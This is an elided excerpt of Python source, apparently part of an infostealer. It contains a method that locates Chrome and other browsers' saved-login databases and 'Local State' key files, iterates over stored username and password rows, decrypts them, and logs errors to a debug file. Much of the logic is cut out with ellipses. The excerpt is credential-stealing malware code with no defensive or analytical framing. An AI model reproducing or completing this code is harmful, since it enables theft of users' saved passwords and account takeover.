    ...
    def pw(self):
        try:
            ...
            def get_browser_passwords():
                ...
                # Vereinfachte, direkte Browser-Pfade für bessere Kompatibilität
                simple_browsers = [
                    {
                        "name": "Chrome",
                ...
                for browser_info in simple_browsers:
                    try:
                        ...
                        if not os.path.exists(login_db_path):
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Login DB not found\n")
                            continue

                        state_file = os.path.join(profile_path, "Local State")
                        if not os.path.exists(state_file):
                            with open(debug_file, "a", encoding="utf-8") as df:
                                df.write(f"❌ {browser_name}: Local State not found\n")
                            continue
                            ...
                            for row in login_data:
                                if len(row) >= 3 and row[0] and row[1] and row[2]:
                                    ...
                                    try:
                                        ...
                                        with open(debug_file, "a", encoding="utf-8") as df:
                                            df.write(f"❌ {browser_name}: Decrypt error: {str(e)}\n")
